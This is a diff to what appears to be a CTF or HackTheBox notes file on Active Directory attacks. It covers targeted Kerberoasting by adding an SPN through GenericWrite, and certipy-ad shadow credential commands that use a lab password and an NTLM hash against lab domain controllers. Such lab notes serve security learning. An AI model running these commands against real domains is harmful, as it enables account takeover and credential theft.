@@ -3,6 +3,7 @@
 - By leveraging the write access, you can add a temporary SPN (Service Principal Name) to the jerri_lancaster account.
 - Once the SPN is added, you can request a service ticket for that account and then carry out the usual Kerberoasting process (offline password cracking)
 
+---
 ## PoC
 
 Added an SPN to for user "jerry_lancaster" temporarily and retrieved his TGT.
@@ -40,4 +41,12 @@ Abusing GenericWrite to an service account and requesting NTLM Hash.
 
 ```
 certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account winrm_svc -dc-ip 10.129.19.236
+```
+
+---
+
+Shadow Credential Attack NTLM Auth
+
+```
+certipy-ad shadow auto -u 'management_svc@certified.htb' -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -dc-ip 10.129.231.186
 ```
